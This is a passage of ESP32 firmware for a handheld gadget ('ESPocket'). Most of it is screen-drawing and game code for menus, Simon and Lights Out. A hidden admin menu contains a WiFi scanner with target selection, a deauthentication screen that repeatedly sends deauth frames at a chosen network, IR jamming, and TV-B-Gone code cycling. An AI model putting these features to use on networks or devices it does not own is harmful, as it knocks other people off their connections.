    display.fillRoundRect(2,(int)roundf(pillYf),SCR_W-4,rowH-1,3,WHITE);
  int idxLo=(int)floorf(smPos)-1, idxHi=(int)floorf(smPos)+visRows+1;
  for (int idx=idxLo; idx<=idxHi; idx++) {
    if (idx<0||idx>=LM_COUNT) continue;
    float yf=baseY+(idx-smPos)*rowH;
    if (yf<baseY-rowH||yf>baseY+visRows*rowH) continue;
    int y=(int)roundf(yf);
    uint16_t c=(idx==lmSel)?BLACK:WHITE;
    display.setTextColor(c);
    if (idx==0) iPlay(9,y+1,c); else iMusic(9,y+1,c);
    display.setCursor(21,y+2); display.print(LM[idx]);
  }
  display.setTextColor(WHITE);
  display.display();
}

void dLedBright() {
  display.clearDisplay();
  hdrL("BRIGHTNESS");
  int pct=(int)roundf(50+50*sinf(animFrame*0.045f));
  display.setTextSize(3); display.setTextColor(WHITE);
  char b[8]; snprintf(b,sizeof(b),"%d%%",pct);
  int tw=strlen(b)*18;
  display.setCursor((SCR_W-tw)/2,22); display.print(b);
  display.drawRect(6,52,SCR_W-12,8,WHITE);
  int fw=(pct*(SCR_W-16))/100;
  if(fw>0) display.fillRect(8,54,fw,4,WHITE);
  display.display();
}

void dLedWifi() {
  display.clearDisplay();
  hdrL("WIFI CONTROL");
  int cx=SCR_W/2, cy=30;
  display.fillCircle(cx,cy+10,3,WHITE);
  for (int arc=0; arc<3; arc++) {
    int r=8+arc*7;
    if ((animFrame/3+arc)%4<3) {
      for (int a=215; a<=325; a+=6) {
        float rad=a*3.14159f/180.0f;
        display.fillCircle(cx+(int)(cos(rad)*r),cy+10+(int)(sin(rad)*r),1,WHITE);
      }
    }
  }
  display.setTextSize(1); display.setTextColor(WHITE);
  const char* t="AP ACTIVE";
  int tw=strlen(t)*6;
  display.setCursor((SCR_W-tw)/2,52); display.print(t);
  display.display();
}

void dGames() {
  const int rowH=10, baseY=14;
  smTick((float)gamesSel);
  display.clearDisplay();
  hdr("GAMES");
  float pillY=baseY+smPos*rowH;
  display.fillRoundRect(2,(int)roundf(pillY)-1,SCR_W-4,rowH,4,WHITE);
  for (int idx=0; idx<GAMES_COUNT; idx++) {
    int y=baseY+idx*rowH;
    bool isSel=(idx==gamesSel);
    display.setTextColor(isSel?BLACK:WHITE);
    display.setTextSize(1);
    iGame(6,y+1,isSel?BLACK:WHITE);
    display.setCursor(20,y+1); display.print(GAMES_M[idx]);
  }
  display.setTextColor(WHITE);
  display.display();
}

// Simon
#define SIMON_MAX_SEQ 32
struct SimonState { uint8_t sequence[SIMON_MAX_SEQ]; int seqLen,showIdx,inputIdx; uint8_t phase; int round,score; unsigned long phaseMs,lastInputMs; int flashPad; };
SimonState simon;
const char* SIMON_LABEL[] = {"UP","DN","SEL","BK"};
void simonInit(){simon.seqLen=1;simon.sequence[0]=random(0,4);simon.showIdx=0;simon.inputIdx=0;simon.phase=1;simon.round=1;simon.score=0;simon.phaseMs=millis();simon.lastInputMs=0;simon.flashPad=-1;}
void simonAddStep(){if(simon.seqLen<SIMON_MAX_SEQ){simon.sequence[simon.seqLen]=random(0,4);simon.seqLen++;}}
void simonStartShow(){simon.phase=1;simon.showIdx=0;simon.phaseMs=millis();simon.flashPad=-1;}
void simonStartInput(){simon.phase=2;simon.inputIdx=0;simon.phaseMs=millis();simon.flashPad=-1;}
void simonUpdate(){
  unsigned long now=millis();
  if(simon.phase==1){unsigned long el=now-simon.phaseMs;int seg=el/680;int inSeg=el%680;if(seg<simon.seqLen)simon.flashPad=(inSeg<400)?simon.sequence[seg]:-1;else{simon.flashPad=-1;simonStartInput();}return;}
  if(simon.phase==2){bool p[4]={touched(TOUCH_UP,baseUp),touched(TOUCH_DOWN,baseDown),touched(TOUCH_SELECT,baseSelect),touched(TOUCH_BACK,baseBack)};for(int i=0;i<4;i++){if(p[i]&&(now-simon.lastInputMs)>120){simon.lastInputMs=now;if(simon.sequence[simon.inputIdx]==i){simon.inputIdx++;simon.flashPad=i;if(simon.inputIdx>=simon.seqLen){simon.round++;simon.score=simon.round-1;simonAddStep();simonStartShow();}}else{simon.phase=3;saveHighScore(simon.round-1);}break;}}return;}
  if(simon.phase==3){if(touched(TOUCH_SELECT,baseSelect)&&(now-simon.lastInputMs)>300){simon.lastInputMs=now;simonInit();}if(touched(TOUCH_BACK,baseBack)&&(now-simon.lastInputMs)>300){simon.lastInputMs=now;goToScene(S_GAMES);}}
}
void simonDrawPad(int idx,uint16_t color,bool filled){int x=(idx%2==0)?2:66;int y=(idx<2)?14:36;int w=60,h=20;if(filled)display.fillRoundRect(x,y,w,h,4,color);else display.drawRoundRect(x,y,w,h,4,color);display.setTextSize(2);display.setTextColor(filled?BLACK:color);const char* t=SIMON_LABEL[idx];int tw=strlen(t)*12;display.setCursor(x+(w-tw)/2,y+3);display.print(t);}
void dSimon(){
  simonUpdate();display.clearDisplay();display.setTextSize(1);display.setTextColor(WHITE);
  char hb[24];snprintf(hb,sizeof(hb),"SIMON  R:%d",simon.round);display.setCursor(2,2);display.print(hb);
  char hb2[16];snprintf(hb2,sizeof(hb2),"HI:%d",highScore);int w=strlen(hb2)*6;display.setCursor(SCR_W-w-2,2);display.print(hb2);
  for(int i=0;i<4;i++)simonDrawPad(i,WHITE,(simon.flashPad==i));
  if(simon.phase==1){display.fillRect(34,24,60,12,BLACK);display.setCursor(38,27);display.print("WATCH...");}
  else if(simon.phase==2){display.fillRect(34,24,60,12,BLACK);display.setCursor(38,27);display.print("YOUR TURN");}
  else if(simon.phase==3){display.fillRoundRect(14,18,100,32,6,BLACK);display.drawRoundRect(14,18,100,32,6,WHITE);display.setCursor(34,22);display.print("WRONG!");char sb[24];snprintf(sb,sizeof(sb),"Round %d  HI %d",simon.round,highScore);display.setCursor(18,33);display.print(sb);display.setCursor(14,41);display.print("SEL=retry BK=exit");}
  display.display();
}

// Lights Out
#define LO_SIZE 4
#define LO_CELL 11
#define LO_GAP  2
#define LO_START_X ((SCR_W-(LO_SIZE*LO_CELL+(LO_SIZE-1)*LO_GAP))/2)
#define LO_START_Y 13
struct LightsState { bool grid[LO_SIZE][LO_SIZE]; int cursor,moves; bool won; unsigned long lastInputMs,startMs; };
LightsState lights;
void loToggle(int r,int c){if(r<0||r>=LO_SIZE||c<0||c>=LO_SIZE)return;lights.grid[r][c]=!lights.grid[r][c];}
void loApply(int r,int c){loToggle(r,c);loToggle(r-1,c);loToggle(r+1,c);loToggle(r,c-1);loToggle(r,c+1);}
void lightsInit(){
  for(int r=0;r<LO_SIZE;r++)for(int c=0;c<LO_SIZE;c++)lights.grid[r][c]=false;
  int n=3+random(0,5);for(int i=0;i<n;i++)loApply(random(0,LO_SIZE),random(0,LO_SIZE));
  bool any=false;for(int r=0;r<LO_SIZE;r++)for(int c=0;c<LO_SIZE;c++)if(lights.grid[r][c])any=true;
  if(!any)loApply(1,1);
  lights.cursor=0;lights.moves=0;lights.won=false;lights.lastInputMs=millis();lights.startMs=millis();
}
void lightsUpdate(){
  unsigned long now=millis();
  if(lights.won){if(touched(TOUCH_SELECT,baseSelect)&&(now-lights.lastInputMs)>300){lights.lastInputMs=now;lightsInit();}if(touched(TOUCH_BACK,baseBack)&&(now-lights.lastInputMs)>300){lights.lastInputMs=now;goToScene(S_GAMES);}return;}
  if(now-lights.lastInputMs<130)return;
  bool pU=touched(TOUCH_UP,baseUp),pD=touched(TOUCH_DOWN,baseDown),pS=touched(TOUCH_SELECT,baseSelect),pB=touched(TOUCH_BACK,baseBack);
  int total=LO_SIZE*LO_SIZE;
  if(pU){if(lights.cursor>0)lights.cursor--;lights.lastInputMs=now;}
  else if(pD){if(lights.cursor<total-1)lights.cursor++;lights.lastInputMs=now;}
  else if(pS){int r=lights.cursor/LO_SIZE,c=lights.cursor%LO_SIZE;loApply(r,c);lights.moves++;lights.lastInputMs=now;bool any=false;for(int rr=0;rr<LO_SIZE;rr++)for(int cc=0;cc<LO_SIZE;cc++)if(lights.grid[rr][cc])any=true;if(!any){lights.won=true;int score=200-lights.moves*5;if(score<20)score=20;saveHighScore(score);}}
  else if(pB){goToScene(S_GAMES);}
}
void dLights(){
  lightsUpdate();display.clearDisplay();display.setTextSize(1);display.setTextColor(WHITE);
  char hb[24];snprintf(hb,sizeof(hb),"LIGHTS OUT  Mv:%d",lights.moves);display.setCursor(2,2);display.print(hb);
  for(int r=0;r<LO_SIZE;r++){for(int c=0;c<LO_SIZE;c++){int x=LO_START_X+c*(LO_CELL+LO_GAP);int y=LO_START_Y+r*(LO_CELL+LO_GAP);int idx=r*LO_SIZE+c;bool isCursor=(idx==lights.cursor);if(lights.grid[r][c])display.fillRoundRect(x,y,LO_CELL,LO_CELL,2,WHITE);else display.drawRoundRect(x,y,LO_CELL,LO_CELL,2,WHITE);if(isCursor){display.drawRoundRect(x-1,y-1,LO_CELL+2,LO_CELL+2,2,WHITE);display.drawRoundRect(x-2,y-2,LO_CELL+4,LO_CELL+4,3,WHITE);}}}
  unsigned long age=millis()-lights.startMs;
  if(!lights.won&&age<4000){display.fillRoundRect(6,26,116,30,6,BLACK);display.drawRoundRect(6,26,116,30,6,WHITE);display.setTextSize(1);display.setTextColor(WHITE);display.setCursor(14,29);display.print("Make all cells OFF");display.setCursor(14,39);display.print("SEL=flip +4 neighbors");display.setCursor(14,48);display.print("UP/DN = move cursor");}
  if(lights.won){display.fillRoundRect(14,20,100,30,6,BLACK);display.drawRoundRect(14,20,100,30,6,WHITE);display.setTextSize(1);display.setTextColor(WHITE);display.setCursor(38,24);display.print("SOLVED!");char sb[20];snprintf(sb,sizeof(sb),"Moves: %d",lights.moves);display.setCursor(34,33);display.print(sb);display.setCursor(14,41);display.print("SEL=again BK=exit");}
  display.display();
}

void dSet() {
  const int rowH=10, baseY=14;
  smTick((float)setSel);
  display.clearDisplay();
  hdr("SETTINGS");
  float pillY=baseY+smPos*rowH;
  display.fillRoundRect(2,(int)roundf(pillY)-1,SCR_W-4,rowH,4,WHITE);
  for (int idx=0; idx<SET_COUNT; idx++) {
    int y=baseY+idx*rowH;
    bool isSel=(idx==setSel);
    display.setTextColor(isSel?BLACK:WHITE);
    display.setTextSize(1);
    display.setCursor(12,y+1); display.print(SET_M[idx]);
  }
  display.setTextColor(WHITE);
  display.display();
}

void dAbout() {
  display.clearDisplay();
  hdrL("ABOUT");
  display.setTextSize(1); display.setTextColor(WHITE);
  lastTempC = readTempC();
  display.setCursor(4, 16); display.print("ESPocket v8.2");
  display.setCursor(4, 26); display.print("ESP32-WROOM-32");
  display.setCursor(4, 36); display.print("Temp: "); display.print(lastTempC, 1); display.print(" C");
  unsigned long up=(millis()-bootMs)/1000UL;
  unsigned long h=up/3600UL,m=(up/60UL)%60UL,s=up%60UL;
  display.setCursor(4, 46);
  char ub[24]; snprintf(ub,sizeof(ub),"Uptime %02lu:%02lu:%02lu",h,m,s); display.print(ub);
  display.setCursor(4, 56);
  char hb[24]; snprintf(hb,sizeof(hb),"Heap %u B",(unsigned)ESP.getFreeHeap()); display.print(hb);
  display.display();
}

void dOverheat() {
  display.clearDisplay();
  if ((animFrame/5) % 2 == 0) display.drawRect(0, 0, SCR_W, SCR_H, WHITE);
  int cx=SCR_W/2, ty=12;
  display.fillTriangle(cx,ty,cx-10,ty+16,cx+10,ty+16,WHITE);
  display.setTextSize(1); display.setTextColor(BLACK);
  display.setCursor(cx-1,ty+6); display.print("!");
  display.setTextColor(WHITE);
  display.setTextSize(2); display.setCursor(14,32); display.print("OVERHEAT");
  display.setTextSize(1);
  char tb[20]; snprintf(tb,sizeof(tb),"%d C",(int)lastTempC);
  int tw=strlen(tb)*6;
  display.setCursor((SCR_W-tw)/2,52); display.print(tb);
  display.setCursor(2,58); display.print("All systems halted");
  display.display();
}

// ============================================================
//  Hidden
// ============================================================
void dHidden() {
  const int rowH=14, baseY=17;
  smTick((float)hiddenSel);
  display.clearDisplay();
  hdr("SYS.ADMIN");
  display.setTextSize(1); display.setTextColor(0x7BEF);
  display.setCursor(4, 15); display.print("-- admin mode --");
  for (int idx=0; idx<HIDDEN_COUNT; idx++) {
    int y=baseY+idx*rowH;
    bool isSel=(idx==hiddenSel);
    if (isSel) { display.fillRoundRect(2,y-1,SCR_W-4,rowH-2,5,WHITE); display.fillRoundRect(0,y-1,3,rowH-2,2,WHITE); }
    else       { display.drawRoundRect(2,y-1,SCR_W-4,rowH-2,5,WHITE); }
    uint16_t c=isSel?BLACK:WHITE;
    switch(idx){case 0:iWifi(6,y+3,c);break;case 1:iBT(6,y+3,c);break;case 2:iFlash(6,y+3,c);break;}
    display.setTextColor(c); display.setTextSize(1);
    display.setCursor(20,y+2); display.print(HIDDEN_IT[idx]);
    if (isSel) display.setTextColor(BLACK); else display.setTextColor(0x7BEF);
    display.setCursor(20,y+10); display.print(HIDDEN_SUB[idx]);
    if (isSel) display.fillTriangle(SCR_W-8,y+4,SCR_W-8,y+11,SCR_W-3,y+7,BLACK);
  }
  display.setTextColor(0x7BEF);
  display.setCursor(4, 57); display.print("BACK = exit admin");
  display.display();
}

void dCyberList(int sel, const char* title, const char** items, int count, float pos) {
  display.clearDisplay();
  hdr(title);
  int rowH=10, baseY=14;
  float pillY=baseY+pos*rowH;
  display.fillRoundRect(2,(int)roundf(pillY)-1,SCR_W-4,rowH,4,WHITE);
  for (int idx=0; idx<count; idx++) {
    int y=baseY+idx*rowH;
    bool isSel=(idx==sel);
    display.setTextSize(1);
    if (isSel) { display.setTextColor(BLACK); display.setCursor(6,y+1); display.print("> "); display.print(items[idx]); }
    else       { display.setTextColor(WHITE); display.setCursor(16,y+1); display.print(items[idx]); }
  }
  display.setTextColor(WHITE);
  display.display();
}

void dWifiH() { smTick((float)wifiHSel); dCyberList(wifiHSel,"WIFI_OPS",WIFI_H_M,WIFI_H_COUNT,smPos); }
void dBtH()   { smTick((float)btHSel);   dCyberList(btHSel,"BT_OPS",BT_H_M,BT_H_COUNT,smPos); }

void dWifiScan() {
  if (!wifiScanRunning && !wifiScanDone) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(50);
    WiFi.scanNetworks(true);
    wifiScanRunning = true;
    sceneStartMs = millis();
    Serial.println("[WIFI] scan started");
  }

  if (!wifiScanDone) {
    int n = WiFi.scanComplete();

    display.clearDisplay();
    hdrL("SCANNING");
    int cx=SCR_W/2, cy=34;
    for(int ring=0;ring<3;ring++){
      int r=((animFrame*2)+ring*15)%40;
      if(r<4)continue;
      uint16_t c=(r<15)?WHITE:((r<28)?0x7BEF:0x39E7);
      display.drawCircle(cx,cy,r,c);
    }
    display.fillCircle(cx,cy,3,WHITE);
    float ang=animFrame*0.15f;
    for(int len=6;len<36;len+=2){
      int sx=cx+(int)(cos(ang)*len);
      int sy=cy+(int)(sin(ang)*len);
      if(sx>=0&&sx<SCR_W&&sy>=20&&sy<56) display.drawPixel(sx,sy,WHITE);
    }
    display.setTextSize(1);display.setTextColor(WHITE);
    display.setCursor(4,57);
    if (n < 0) {
      display.print("Scanning WiFi");
      int dots=(animFrame/4)%4;for(int i=0;i<dots;i++)display.print(".");
    } else {
      char b[20];snprintf(b,sizeof(b),"Found %d nets", n);
      display.print(b);
    }
    display.display();

    if (n >= 0) {
      NET_COUNT = (n < NET_MAX) ? n : NET_MAX;
      for (int i = 0; i < NET_COUNT; i++) {
        String s = WiFi.SSID(i);
        strncpy(NETS[i].ssid, s.c_str(), 32);
        NETS[i].ssid[32] = 0;
        NETS[i].rssi = (int8_t)WiFi.RSSI(i);
        NETS[i].ch   = (uint8_t)WiFi.channel(i);
        NETS[i].locked = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        uint8_t* b = WiFi.BSSID(i);
        for (int k = 0; k < 6; k++) NETS[i].bssid[k] = b[k];
      }
      WiFi.scanDelete();
      wifiScanDone = true;
      wifiScanRunning = false;
      netSel = 0;
      Serial.printf("[WIFI] scan done, %d nets\n", NET_COUNT);
      WiFi.mode(WIFI_OFF);
      WiFi.disconnect(true);
      smSnapNext();
      sceneStartMs = millis();
    }
    return;
  }

  if (NET_COUNT == 0) {
    display.clearDisplay();
    hdrL("NETWORKS");
    display.setTextSize(1);display.setTextColor(WHITE);
    display.setCursor(20, 30);display.print("No networks found");
    display.display();
    return;
  }

  const int visRows=3,rowH=12,baseY=18;
  int targetOff=(netSel>=2)?(netSel-1):0;
  if(targetOff+visRows>NET_COUNT)targetOff=NET_COUNT-visRows;
  if(targetOff<0)targetOff=0;
  smTick((float)targetOff);
  display.clearDisplay();
  int idxLo=(int)floorf(smPos)-1,idxHi=(int)floorf(smPos)+visRows+1;
  for(int si=idxLo;si<=idxHi;si++){
    if(si<0||si>=NET_COUNT)continue;
    float yf=baseY+(si-smPos)*rowH;
    if(yf<baseY-rowH||yf>baseY+visRows*rowH)continue;
    int y=(int)roundf(yf);
    bool isSel=(si==netSel);
    if(isSel){display.fillRoundRect(2,y,SCR_W-4,rowH-2,4,WHITE);display.setTextColor(BLACK);}
    else{display.drawRoundRect(2,y,SCR_W-4,rowH-2,4,WHITE);display.setTextColor(WHITE);}
    display.setTextSize(1);
    display.setCursor(6,y+3);
    char b[18];snprintf(b,sizeof(b),"%.16s",NETS[si].ssid);
    display.print(b);
    for(int i=0;i<4;i++){
      int h=2+i*2,bx=SCR_W-22+i*3,by=y+9-h;
      int strength=constrain((NETS[si].rssi+90)/12,0,4);
      if(i<strength)display.fillRect(bx,by,2,h,isSel?BLACK:WHITE);
      else display.drawRect(bx,by,2,h,isSel?BLACK:WHITE);
    }
    if(NETS[si].locked){
      uint16_t lc=isSel?BLACK:WHITE;
      int lx=SCR_W-42,ly=y+2;
      display.drawRect(lx,ly+3,5,4,lc);
      display.drawPixel(lx+1,ly+2,lc);
      display.drawPixel(lx+2,ly+1,lc);
      display.drawPixel(lx+3,ly+2,lc);
    }
  }
  hdrL("NETWORKS");
  display.display();
}

void dWifiTarget() {
  smTick((float)wifiActSel);
  display.clearDisplay();
  hdr("ACTIONS");
  display.setTextSize(1);display.setTextColor(WHITE);
  display.setCursor(2,14);
  if (targetNet >= 0 && targetNet < NET_COUNT) {
    display.print("Target: ");
    char b[18]; snprintf(b,sizeof(b),"%.16s",NETS[targetNet].ssid);
    display.print(b);
  } else {
    display.print("Target: (none)");
  }
  int rowH=10,baseY=25;
  float pillY=baseY+smPos*rowH;
  display.fillRoundRect(2,(int)roundf(pillY)-1,SCR_W-4,rowH,4,WHITE);
  for(int idx=0;idx<WIFI_ACT_COUNT;idx++){
    int y=baseY+idx*rowH;
    bool isSel=(idx==wifiActSel);
    display.setTextColor(isSel?BLACK:WHITE);
    display.setCursor(12,y+1);display.print(WIFI_ACT_M[idx]);
  }
  display.setTextColor(WHITE);
  display.display();
}

void dDeauth() {
  unsigned long now = millis();
  display.clearDisplay();
  hdr("DEAUTH");
  display.setTextSize(1);display.setTextColor(WHITE);
  display.setCursor(2,14);
  display.print("TGT: ");
  if (targetNet >= 0 && targetNet < NET_COUNT) {
    char b[18]; snprintf(b,sizeof(b),"%.16s",NETS[targetNet].ssid);
    display.print(b);
  }
  display.setCursor(2,26);
  display.print("Ch: ");
  if (targetNet >= 0 && targetNet < NET_COUNT) display.print(NETS[targetNet].ch);
  display.setCursor(2,38);
  char fb[24];
  snprintf(fb,sizeof(fb),"Frames: %lu",deauthCount);
  display.print(fb);
  unsigned long el = (now - deauthStartMs) / 1000;
  display.setCursor(2,50);
  if (el > 0) {
    snprintf(fb,sizeof(fb),"Rate: %lu/s  T:%lus",deauthCount/el,el);
    display.print(fb);
  }
  if ((animFrame/3)%2==0) display.fillCircle(SCR_W-8,6,3,WHITE);
  else                    display.drawCircle(SCR_W-8,6,3,WHITE);
  display.setCursor(2,58);display.print("BACK = stop");
  display.display();
  if (now - deauthLast >= 20) {
    deauthLast = now;
    for (int i = 0; i < 5; i++) deauthRunOnce();
  }
}

void dMock() {
  display.clearDisplay();
  hdr(mockTitle);
  display.setTextSize(1);display.setTextColor(WHITE);
  display.setCursor(4,15);display.print("TGT: ");display.print(mockSub);
  int bx=6,bw=116;
  display.drawRect(bx,26,bw,6,WHITE);
  int p=(animFrame*3)%100;
  display.fillRect(bx+1,27,(p*(bw-2))/100,4,WHITE);
  display.setCursor(6,38);
  display.print("[ RUNNING ]");
  display.setCursor(4,58);display.print("BACK = return");
  display.display();
}

// ============================================================
//  IR Screens
// ============================================================
void dIrH() {
  const int rowH=10, baseY=14;
  smTick((float)irSel);
  display.clearDisplay();
  hdr("IR_OPS");
  float pillY=baseY+smPos*rowH;
  display.fillRoundRect(2,(int)roundf(pillY)-1,SCR_W-4,rowH,4,WHITE);
  for (int idx=0; idx<IR_MENU_COUNT; idx++) {
    int y=baseY+idx*rowH;
    bool isSel=(idx==irSel);
    display.setTextColor(isSel?BLACK:WHITE);
    display.setTextSize(1);
    display.setCursor(12,y+1); display.print(IR_MENU[idx]);
  }
  display.setTextColor(WHITE);
  display.display();
}

void dIrLearn() {
  display.clearDisplay();
  hdrL("IR LEARN");
  display.setTextSize(1);display.setTextColor(WHITE);
  char l1[24];snprintf(l1,sizeof(l1),"Slot #%d/%d",irLearnSlot+1,IR_MAX_SLOTS);
  display.setCursor(4,16);display.print(l1);
  display.setCursor(4,28);display.print("Point remote at RX");
  display.setCursor(4,38);display.print("Press any button...");
  for(int i=0;i<8;i++){int x=8+i*14;if((animFrame/3+i)%4<2)display.fillRect(x,50,10,8,WHITE);else display.drawRect(x,50,10,8,WHITE);}
  display.setCursor(4,60);display.print("BACK = cancel");
  display.display();
  if(irrecv.decode(&irResults)){
    decode_type_t p=irResults.decode_type;
    uint8_t proto=255;
    if(p==NEC)proto=0;else if(p==SONY)proto=1;else if(p==SAMSUNG)proto=2;
    else if(p==LG)proto=3;else if(p==JVC)proto=4;else if(p==RC5)proto=5;
    if(proto!=255){
      irSlots[irLearnSlot].valid=true;
      irSlots[irLearnSlot].protocol=proto;
      irSlots[irLearnSlot].code=irResults.value;
      irSlots[irLearnSlot].bits=irResults.bits;
      snprintf(irSlots[irLearnSlot].name,IR_NAME_LEN,"%s_%d",IR_PROTO_NAMES[proto],irLearnSlot+1);
      irSaveSlot(irLearnSlot);
      Serial.printf("[IR] learned slot %d proto=%s code=0x%08X\n",irLearnSlot,IR_PROTO_NAMES[proto],(unsigned)irResults.value);
      display.clearDisplay();hdrL("IR LEARN");
      display.setTextColor(WHITE);
      display.setCursor(20,24);display.print("SAVED!");
      display.setCursor(4,40);display.print("Proto: ");display.print(IR_PROTO_NAMES[proto]);
      display.setCursor(4,52);display.printf("0x%08X",(unsigned)irResults.value);
      display.display();
      delay(1200);
      irrecv.resume();
      goToScene(S_IR_H);
      return;
    }
    irrecv.resume();
  }
}

void dIrList() {
  const int visRows=3,rowH=12,baseY=18;
  int targetOff=(irListSel>=2)?(irListSel-1):0;
  if(targetOff+visRows>IR_MAX_SLOTS)targetOff=IR_MAX_SLOTS-visRows;
  if(targetOff<0)targetOff=0;
  smTick((float)targetOff);
  display.clearDisplay();
  int idxLo=(int)floorf(smPos)-1,idxHi=(int)floorf(smPos)+visRows+1;
  for(int si=idxLo;si<=idxHi;si++){
    if(si<0||si>=IR_MAX_SLOTS)continue;
    float yf=baseY+(si-smPos)*rowH;
    if(yf<baseY-rowH||yf>baseY+visRows*rowH)continue;
    int y=(int)roundf(yf);
    bool isSel=(si==irListSel);
    bool valid=irSlots[si].valid;
    if(isSel){display.fillRoundRect(2,y,SCR_W-4,rowH-2,4,WHITE);display.setTextColor(BLACK);}
    else{display.drawRoundRect(2,y,SCR_W-4,rowH-2,4,WHITE);display.setTextColor(valid?WHITE:0x7BEF);}
    display.setTextSize(1);
    display.setCursor(6,y+3);
    if(valid){char b[20];snprintf(b,sizeof(b),"#%d %s",si+1,IR_PROTO_NAMES[irSlots[si].protocol]);display.print(b);display.setCursor(70,y+3);display.printf("0x%04X",(unsigned)(irSlots[si].code&0xFFFF));}
    else display.printf("#%d (empty)",si+1);
  }
  hdrL("SAVED CODES");
  display.display();
}

void dIrTx() {
  unsigned long elapsed=millis()-sceneStartMs;
  display.clearDisplay();
  hdrL("TRANSMITTING");
  display.setTextSize(1);display.setTextColor(WHITE);
  if(irLastSlot>=0&&irLastSlot<IR_MAX_SLOTS&&irSlots[irLastSlot].valid){
    char b[24];snprintf(b,sizeof(b),"Slot #%d  %s",irLastSlot+1,IR_PROTO_NAMES[irSlots[irLastSlot].protocol]);
    display.setCursor(4,18);display.print(b);
    display.setCursor(4,30);display.printf("Code: 0x%08X",(unsigned)irSlots[irLastSlot].code);
  }
  int cx=64,cy=50,maxR=12;
  for(int r=0;r<3;r++){int rr=((animFrame*2)+r*5)%maxR;if(rr>3)display.drawCircle(cx,cy,rr,WHITE);}
  display.fillCircle(cx,cy,2,WHITE);
  if(elapsed>1000)goToScene(S_IR_H);
  display.display();
}

void dIrJam() {
  unsigned long now=millis();
  display.clearDisplay();
  hdr("JAMMING");
  display.setTextSize(1);display.setTextColor(WHITE);
  display.setCursor(2,14);display.print("Proto: ");display.print(IR_PROTO_NAMES[irJamProtoIdx]);
  char b[24];snprintf(b,sizeof(b),"Bursts: %lu",irJamCount);
  display.setCursor(2,26);display.print(b);
  unsigned long el=(now-irJamStart)/1000;
  snprintf(b,sizeof(b),"Time: %lu s",el);
  display.setCursor(2,38);display.print(b);
  for(int x=0;x<SCR_W;x++){int y1=52+(int)(sinf((x+animFrame*4)*0.1f)*5);int y2=52+(int)(sinf((x-animFrame*6)*0.15f)*3);display.drawPixel(x,y1,WHITE);display.drawPixel(x,y2,WHITE);}
  display.setCursor(2,60);display.print("BACK = stop");
  display.display();
  if(now-irJamLastSend>=15){irJamLastSend=now;irSendJamBurst();}
}

void dIrTvbg() {
  unsigned long now=millis();
  display.clearDisplay();
  hdrL("TV-B-GONE");
  display.setTextSize(1);display.setTextColor(WHITE);
  display.setCursor(4,16);display.print("Src: built-in");
  char b[24];snprintf(b,sizeof(b),"Code: %d / %d",(irTvbgIdx%TVBG_COUNT)+1,TVBG_COUNT);
  display.setCursor(4,28);display.print(b);
  snprintf(b,sizeof(b),"Round: %d",(irTvbgIdx/TVBG_COUNT)+1);
  display.setCursor(4,40);display.print(b);
  int bx=6,bw=116;
  display.drawRect(bx,50,bw,5,WHITE);
  int p=((irTvbgIdx%TVBG_COUNT)*(bw-2))/TVBG_COUNT;
  if(p>0)display.fillRect(bx+1,51,p,3,WHITE);
  display.setCursor(4,58);display.print("BACK = stop");
  display.display();
  if(now-irTvbgLast>=250){irTvbgLast=now;irSendTvbgCode(irTvbgIdx%TVBG_COUNT);irTvbgIdx++;}
}

// ============================================================
//  Input
// ============================================================
bool touched(int pin,int baseline){int v=touchRead(pin);int t=baseline-(baseline*TOUCH_DROP_PCT/100);return(v<t);}
void calibrateTouch(){
  Serial.println("[TOUCH] Calibrating...");delay(500);
  long sU=0,sD=0,sS=0,sB=0;
  for(int i=0;i<20;i++){sU+=touchRead(TOUCH_UP);sD+=touchRead(TOUCH_DOWN);sS+=touchRead(TOUCH_SELECT);sB+=touchRead(TOUCH_BACK);delay(30);}
  baseUp=sU/20;baseDown=sD/20;baseSelect=sS/20;baseBack=sB/20;
  Serial.printf("[TOUCH] U=%d D=%d S=%d B=%d\n",baseUp,baseDown,baseSelect,baseBack);
}
void goToScene(Scene s){currentScene=s;sceneStartMs=millis();smSnapNext();lastInput=0;Serial.printf("[SCENE] -> %d\n",(int)s);}

void handleUp(){
  switch(currentScene){
    case S_MAIN:if(mainSel>0)mainSel--;break;
    case S_SONGS:if(songSel>0)songSel--;break;
    case S_BT_MENU:if(btMenuSel>0)btMenuSel--;break;
    case S_GAMES:if(gamesSel>0)gamesSel--;break;
    case S_HIDDEN:if(hiddenSel>0)hiddenSel--;break;
    case S_WIFI_H:if(wifiHSel>0)wifiHSel--;break;
    case S_BT_H:if(btHSel>0)btHSel--;break;
    case S_IR_H:if(irSel>0)irSel--;break;
    case S_WIFI_SCAN:if(netSel>0)netSel--;break;
    case S_WIFI_TARGET:if(wifiActSel>0)wifiActSel--;break;
    case S_IR_LIST:if(irListSel>0)irListSel--;break;
    case S_LED_MENU:if(ledMenuSel>0)ledMenuSel--;break;
    case S_LED_FX:if(fxSel>0)fxSel--;break;
    case S_LED_MUS:if(lmSel>0)lmSel--;break;
    case S_SET:if(setSel>0)setSel--;break;
  }
}
void handleDown(){
  switch(currentScene){
    case S_MAIN:if(mainSel<MAIN_COUNT-1)mainSel++;break;
    case S_SONGS:if(songSel<SONG_COUNT-1)songSel++;break;
    case S_BT_MENU:if(btMenuSel<BT_M_COUNT-1)btMenuSel++;break;
    case S_GAMES:if(gamesSel<GAMES_COUNT-1)gamesSel++;break;
    case S_HIDDEN:if(hiddenSel<HIDDEN_COUNT-1)hiddenSel++;break;
    case S_WIFI_H:if(wifiHSel<WIFI_H_COUNT-1)wifiHSel++;break;
    case S_BT_H:if(btHSel<BT_H_COUNT-1)btHSel++;break;
    case S_IR_H:if(irSel<IR_MENU_COUNT-1)irSel++;break;
    case S_WIFI_SCAN:if(netSel<NET_COUNT-1)netSel++;break;
    case S_WIFI_TARGET:if(wifiActSel<WIFI_ACT_COUNT-1)wifiActSel++;break;
    case S_IR_LIST:if(irListSel<IR_MAX_SLOTS-1)irListSel++;break;
    case S_LED_MENU:if(ledMenuSel<LED_M_COUNT-1)ledMenuSel++;break;
    case S_LED_FX:if(fxSel<FX_COUNT-1)fxSel++;break;
    case S_LED_MUS:if(lmSel<LM_COUNT-1)lmSel++;break;
    case S_SET:if(setSel<SET_COUNT-1)setSel++;break;
  }
}
void handleSelect(){
  switch(currentScene){
    case S_MAIN:
      if(mainSel==1){songSel=0;goToScene(S_SONGS);}
      else if(mainSel==2){btMenuSel=0;goToScene(S_BT_MENU);}
      else if(mainSel==3){gamesSel=0;goToScene(S_GAMES);}
